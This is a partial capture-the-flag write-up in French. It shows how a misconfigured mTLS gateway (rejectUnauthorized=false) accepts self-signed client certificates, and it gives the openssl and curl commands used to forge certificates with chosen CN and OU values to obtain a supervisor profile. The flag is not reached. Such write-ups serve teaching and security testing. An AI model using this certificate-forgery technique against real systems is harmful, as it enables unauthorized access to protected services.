# Write-up -- Liaisons dangereuses

> Write-up partiel : le flag n'a pas été obtenu à ce stade. Ce document présente la méthodologie et les résultats obtenus, ainsi que les pistes restantes à explorer.

## Contexte

Un portail interne de supervision protège une ressource sensible derrière une authentification par **certificat client (mTLS)**. L'objectif est d'analyser le mécanisme de contrôle d'accès de l'application, puis d'obtenir les privilèges nécessaires (`admin`) pour récupérer le flag.

L'énoncé précise qu'il faut *a priori* un certificat valide signé par une CA nommée `liaisons-ca` pour accéder aux endpoints.

## Reconnaissance

Un `robots.txt` révèle un endpoint non protégé exposant des logs applicatifs :

```
/log/app.log
```

Contenu du log :

```
2025-11-19T02:15:01Z INFO  boot: mtls-gateway starting (pid=1421)
2025-11-19T02:15:02Z INFO  tls: server cert loaded (CN=supervisor.liaisons.local)
2025-11-19T02:15:03Z INFO  tls: requestCert=true, rejectUnauthorized=false
2025-11-19T02:15:05Z INFO  http: GET / 200 (agent=probe)
2025-11-19T02:15:08Z INFO  http: GET /whoami 401 (no client cert)
2025-11-19T02:16:44Z INFO  audit: rotation policy applied (mtls-gateway)
2025-11-19T02:17:03Z INFO  idmap: legacy profile key loaded (b64= c3ViamVjdCBPVS9PIG1hcHBlZCB0byBkaXJlY3RvcnkgdWlk )
2025-11-19T02:17:07Z WARN  idmap: ldap compat resolver enabled for cert subjects
2025-11-19T02:17:11Z INFO  audit: cleanup queued
```

Deux informations critiques en ressortent :

1. **`requestCert=true, rejectUnauthorized=false`** : le serveur TLS demande bien un certificat client, mais **n'exige pas qu'il soit signé par une CA de confiance**. En pratique, cela signifie que n'importe quel certificat auto-signé (même non émis par `liaisons-ca`) sera accepté au niveau TLS, l'application doit donc faire sa propre logique de validation applicative sur le contenu du certificat.
2. Une chaîne encodée en base64 : `c3ViamVjdCBPVS9PIG1hcHBlZCB0byBkaXJlY3RvcnkgdWlk`, qui se décode en :
   ```
   subject OU/O mapped to directory uid
   ```
   Cela indique que l'application dérive un **uid d'annuaire (LDAP-like)** à partir des champs `OU` (Organizational Unit) et/ou `O` (Organization) du certificat client, via un "idmap" / résolveur LDAP compatible.

## Exploitation - Forger un certificat client

Puisque `rejectUnauthorized=false`, on peut générer notre propre certificat auto-signé sans jamais avoir besoin de la clé privée de `liaisons-ca`.

### Tentative 1 - CN/OU/O = admin

```bash
openssl genrsa -out client.key 2048
openssl req -new -key client.key -out client.csr -subj "/CN=admin/OU=admin/O=admin"
openssl x509 -req -days 365 -in client.csr -signkey client.key -out client.crt
```

```bash
curl -k https://57.128.112.118:12024/whoami --cert client.crt --key client.key
```

```json
{
  "subject": { "CN": "admin", "OU": "admin", "O": "admin" },
  "admin": false,
  "cn_status": "invalide",
  "directory_lookup": {
    "source_field": "OU",
    "source_value": "admin",
    "profile": null
  }
}
```

→ `cn_status: invalide`. Le serveur valide donc le **CN** contre une valeur attendue précise, indépendamment de la CA. Il faut réutiliser le CN vu dans les logs (`supervisor.liaisons.local`).

### Tentative 2 - CN correct, OU=admin, O=liaisons

```bash
openssl req -new -key client.key -out client.csr -subj "/CN=supervisor.liaisons.local/OU=admin/O=liaisons"
openssl x509 -req -days 1 -in client.csr -signkey client.key -out client.crt
```

```json
{
  "subject": { "CN": "supervisor.liaisons.local", "OU": "admin", "O": "liaisons" },
  "admin": false,
  "cn_status": "valide",
  "directory_lookup": { "source_field": "OU", "source_value": "admin", "profile": null }
}
```

→ Cette fois `cn_status: valide`, mais `directory_lookup.profile` reste `null` : la valeur `OU=admin` **n'existe pas** dans l'annuaire simulé (idmap). Le CN correct ne suffit donc pas, il faut aussi un `OU` qui corresponde à un profil connu.

### Tentative 3 - OU=supervisor

```bash
openssl req -new -key client.key -out client.csr -subj "/CN=supervisor.liaisons.local/OU=supervisor/O=liaisons"
openssl x509 -req -days 1 -in client.csr -signkey client.key -out client.crt
curl -vk https://57.128.112.118:12024/whoami --cert client.crt --key client.key
```

Cette fois le mapping fonctionne :

```json
{
  "subject": { "CN": "supervisor.liaisons.local", "OU": "supervisor", "O": "liaisons" },
  "admin": false,
  "cn_status": "valide",
  "directory_lookup": {
    "source_field": "OU",
    "source_value": "supervisor",
    "profile_source": "idmap",
    "profile": {
      "uid": "supervisor",
      "role": "supervisor",
      "displayName": "Superviseur principal"
    }
  }
}
```

L'annuaire simulé (`idmap`) résout donc bien un profil pour `OU=supervisor` : `uid=supervisor`, `role=supervisor`. Mais le champ `admin` reste `false` donc le rôle `supervisor` n'est pas suffisant.

On note également, dans la sortie verbeuse de `curl`, que le certificat **serveur** légitime est émis par :
```
issuer: CN=liaisons-ca
```
ce qui confirme l'existence réelle de cette CA (mentionnée dans l'énoncé), même si elle n'est pas nécessaire pour s'authentifier côté client vu la mauvaise configuration `rejectUnauthorized=false`.

## État actuel / Pistes restantes

À ce stade, on a identifié une chaîne de validation applicative en 3 niveaux :
1. **CN** doit correspondre exactement à `supervisor.liaisons.local` (probablement le seul CN connu du système, ou une regex/liste blanche).
2. **OU** doit correspondre à un `uid` existant dans l'annuaire simulé (`idmap`), ce qui détermine le `role` renvoyé.
3. Le champ **`admin`** de la réponse dépend du `role` résolu, `supervisor` ne suffit pas.

Pistes non encore explorées pour la suite :
- Vérifier si le champ **`O`** (Organization) a lui aussi une influence sur le `directory_lookup`, ou si seul `OU` est utilisé comme l'indique `source_field`.
- Étudier si un **autre CN** est accepté (peut-être une liste de CN valides plutôt qu'un seul), en cherchant d'autres indices.
- Regarder si la réponse `admin` dépend d'une combinaison **rôle + autre attribut** (ex: `displayName`, un groupe LDAP simulé) qu'il faudrait aussi forger.
